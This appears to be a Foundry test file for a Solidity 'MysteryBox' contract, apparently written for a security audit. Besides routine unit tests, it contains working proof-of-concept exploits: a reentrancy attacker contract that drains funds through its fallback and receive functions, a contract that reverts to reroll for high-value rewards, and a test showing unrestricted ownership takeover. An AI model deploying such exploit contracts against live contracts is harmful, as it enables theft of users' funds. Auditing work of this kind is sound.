// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console2} from "forge-std/Test.sol";
import "forge-std/Test.sol";
import "../src/MysteryBox.sol";

contract MysteryBoxTest is Test {
    MysteryBox public mysteryBox;
    address public owner;
    address public user1;
    address public user2;

    function setUp() public {
        owner = makeAddr("owner");
        vm.deal(owner, 100 ether);
        user1 = address(0x1);
        user2 = address(0x2);

        vm.prank(owner);
        mysteryBox = new MysteryBox{value: 0.1 ether}();
        console.log("Reward Pool Length:", mysteryBox.getRewardPool().length);
    }

    function testOwnerIsSetCorrectly() public view {
        assertEq(mysteryBox.owner(), owner);
    }

    function testSetBoxPrice() public {
        uint256 newPrice = 0.2 ether;
        mysteryBox.setBoxPrice(newPrice);
        assertEq(mysteryBox.boxPrice(), newPrice);
    }

    function testSetBoxPrice_NotOwner() public {
        vm.prank(user1);
        vm.expectRevert("Only owner can set price");
        mysteryBox.setBoxPrice(0.2 ether);
    }

    function testAddReward() public {
        vm.prank(owner);
        mysteryBox.addReward("Diamond Coin", 2 ether);
        MysteryBox.Reward[] memory rewards = mysteryBox.getRewardPool();
        assertEq(rewards.length, 5);
        assertEq(rewards[3].name, "Diamond Coin");
        assertEq(rewards[3].value, 2 ether);
    }

    function testAddReward_NotOwner() public {
        vm.prank(user1);
        vm.expectRevert("Only owner can add rewards");
        mysteryBox.addReward("Diamond Coin", 2 ether);
    }

    function testBuyBox() public {
        vm.deal(user1, 1 ether);
        vm.prank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();
        assertEq(mysteryBox.boxesOwned(user1), 1);
    }

    function testBuyBox_IncorrectETH() public {
        vm.deal(user1, 1 ether);
        vm.prank(user1);
        vm.expectRevert("Incorrect ETH sent");
        mysteryBox.buyBox{value: 0.05 ether}();
    }

    function testOpenBox() public {
        vm.deal(user1, 1 ether);
        vm.prank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();
        console.log("Before Open:", mysteryBox.boxesOwned(user1));
        vm.prank(user1);
        mysteryBox.openBox();
        console.log("After Open:", mysteryBox.boxesOwned(user1));
        assertEq(mysteryBox.boxesOwned(user1), 0);

        vm.prank(user1);
        MysteryBox.Reward[] memory rewards = mysteryBox.getRewards();
        console2.log(rewards[0].name);
        assertEq(rewards.length, 1);
    }

    function testOpenBox_NoBoxes() public {
        vm.prank(user1);
        vm.expectRevert("No boxes to open");
        mysteryBox.openBox();
    }

    function testTransferReward_InvalidIndex() public {
        vm.prank(user1);
        vm.expectRevert("Invalid index");
        mysteryBox.transferReward(user2, 0);
    }

    function testWithdrawFunds() public {
        vm.deal(user1, 1 ether);
        vm.prank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();

        uint256 ownerBalanceBefore = owner.balance;
        console.log("Owner Balance Before:", ownerBalanceBefore);
        vm.prank(owner);
        mysteryBox.withdrawFunds();
        uint256 ownerBalanceAfter = owner.balance;
        console.log("Owner Balance After:", ownerBalanceAfter);

        assertEq(ownerBalanceAfter - ownerBalanceBefore, 0.1 ether);
    }

    function testWithdrawFunds_NotOwner() public {
        vm.prank(user1);
        vm.expectRevert("Only owner can withdraw");
        mysteryBox.withdrawFunds();
    }

    function testChangeOwner() public {
        mysteryBox.changeOwner(user1);
        assertEq(mysteryBox.owner(), user1);
    }

    function testChangeOwner_AccessControl() public {
        vm.prank(user1);
        mysteryBox.changeOwner(user1);
        assertEq(mysteryBox.owner(), user1);
    }

    function testReentrance() public {
        ReenrancyAttacker attackerContract = new ReenrancyAttacker{value: 0.1 ether}(address(mysteryBox));
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttarckerBalance = address(attackerContract).balance;
        uint256 startingContractBalance = address(mysteryBox).balance;

        vm.prank(attackUser);

        /*     uint256 time = block.timestamp;
        while (true) {
            uint256 randomValue = uint256(keccak256(abi.encodePacked(block.timestamp, address(attackerContract)))) % 100;

            if (randomValue <= 75) {
                vm.warp(time + 1000);
                time += 1000;
            } else {
                break;
            }
        } */
        vm.warp(9001);
        attackerContract.buyBox();
        MysteryBox.Reward[] memory rewards = attackerContract.getRewards();

        for (uint256 i = 0; i < rewards.length; i++) {
            console.log("reward name:", rewards[i].name);
            console.log("reward value:", rewards[i].value);
        }

        attackerContract.attackSingle();

        console2.log("Starting Attacker Balance:", startingAttarckerBalance);
        console2.log("Starting Contract Balance:", startingContractBalance);

        console2.log("ending Attacker Balance:", address(attackerContract).balance);
        console2.log("ending Contract Balance:", address(mysteryBox).balance);
    }

    function testGetHigherReward() public {
        MaliciousUser attackerContract = new MaliciousUser{value: 0.1 ether}(address(mysteryBox));
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        vm.prank(attackUser);
        vm.expectRevert();
        attackerContract.buyBox();
    }
}

contract ReenrancyAttacker {
    MysteryBox public mysteryBox;

    constructor(address _address) payable {
        mysteryBox = MysteryBox(_address);
    }

    function buyBox() public payable {
        mysteryBox.buyBox{value: 0.1 ether}();
        mysteryBox.openBox();
    }

    function attack() public {
        mysteryBox.claimAllRewards();
    }

    function attackSingle() public {
        mysteryBox.claimSingleReward(0);
    }

    function getRewards() public view returns (MysteryBox.Reward[] memory value) {
        value = mysteryBox.getRewards();
    }

    fallback() external payable {
        if (address(mysteryBox).balance > 0) {
            attackSingle();
        }
    }

    receive() external payable {
        if (address(mysteryBox).balance > 0) {
            attackSingle();
        }
    }
}

contract MaliciousUser {
    MysteryBox public mysteryBox;

    constructor(address _address) payable {
        mysteryBox = MysteryBox(_address);
    }

    function buyBox() public payable {
        mysteryBox.buyBox{value: 0.1 ether}();
        mysteryBox.openBox();
        MysteryBox.Reward[] memory rewards = mysteryBox.getRewards();

        if (rewards[0].value < 0.5 ether) {
            revert();
        }
    }
}
